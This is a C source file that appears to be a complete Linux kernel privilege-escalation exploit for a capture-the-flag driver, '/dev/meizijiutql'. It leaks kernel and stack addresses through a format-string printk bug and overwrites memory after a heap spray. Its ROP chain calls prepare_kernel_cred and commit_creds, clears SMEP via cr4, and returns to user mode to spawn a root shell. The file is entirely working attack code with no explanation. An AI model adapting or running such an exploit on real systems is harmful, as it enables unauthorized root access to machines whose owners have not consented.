// musl-gcc -static exploit.c -o a.out
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <pty.h>
#include <signal.h>

void s()
{
    puts("Paused (press any to continue)");
    getchar();
}

void shell()
{
    system("/bin/sh");
    exit(0);
}

unsigned long long user_cs, user_ss, user_eflags, user_sp;
void save_status()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp));
}

int main()
{
    int fd, i;
    unsigned long long kernel_addr, stack_addr, *rop, offset;
    char buf[0x2000];

    setbuf(stdout, NULL);
    save_status();
    signal(SIGSEGV, shell);

    if ((fd = open("/dev/meizijiutql", O_RDWR)) == -1)
    {
        fprintf(stderr, "open error: %m\n");
        exit(1);
    }

    ioctl(fd, 0x73311337, 0xff0); // kmalloc

    write(fd, "%llx %llx %llx %llx %llx kernel: 0x%llx %llx %llx %llx stack: 0x%llx %llx %llx %llx %llx\n", 90);
    // s();
    ioctl(fd, 0xDEADBEEF, 0); // printk
    printf("Input kernel: ");
    scanf("%p", (char **)&kernel_addr);
    kernel_addr -= 0x1c827f;
    offset = kernel_addr - 0xFFFFFFFF81000000;
    printf("kernel_addr: 0x%llx\n\n", kernel_addr);

    printf("Input stack: ");
    scanf("%p", (char **)&stack_addr);
    getchar();
    stack_addr &= 0xfffffffffffff000;
    printf("stack_addr: 0x%llx\n\n", stack_addr);

    for (i = 0; i < 0x140; i++)
    {
        ioctl(fd, 0x73311337, 0xff0);
    }

#define PADDING 0xf00

    for (i = 0; i + stack_addr < stack_addr + PADDING; i += 8)
    {
        *(unsigned long long *)(buf + i) = offset + 0xffffffff81005bb3; // ret
    }
    *(unsigned long long *)(buf + 0x1000) = stack_addr;
    write(fd, buf, 0x1008);

    ioctl(fd, 0x73311337, 0xff0);
    ioctl(fd, 0x73311337, 0xff0);

    rop = (unsigned long long *)(buf + PADDING);
    *rop++ = offset + 0xffffffff810460e0; // xor edi, edi; ret;
    *rop++ = offset + 0xffffffff81081790; // prepare_kernel_cred
    *rop++ = offset + 0xffffffff819e2959; // mov rdi, rax; mov qword ptr [rdi], 1; ret;
    *rop++ = offset + 0xffffffff81081410; // commit_creds

    *rop++ = offset + 0xffffffff8101ac0c; // pop rax; ret;
    *rop++ = 0x6f0;
    *rop++ = offset + 0xffffffff810035b5; // mov cr4, rax; push rcx; popfq; ret;

    *rop++ = offset + 0xffffffff81a00d5a; // swapgs; popfq; ret;
    *rop++ = 0;
    *rop++ = offset + 0xffffffff81021762; // iretq; ret;

    *rop++ = (unsigned long long)shell;
    *rop++ = user_cs;
    *rop++ = user_eflags;
    *rop++ = user_sp;
    *rop++ = user_ss;

    write(fd, buf, 0x1000);
}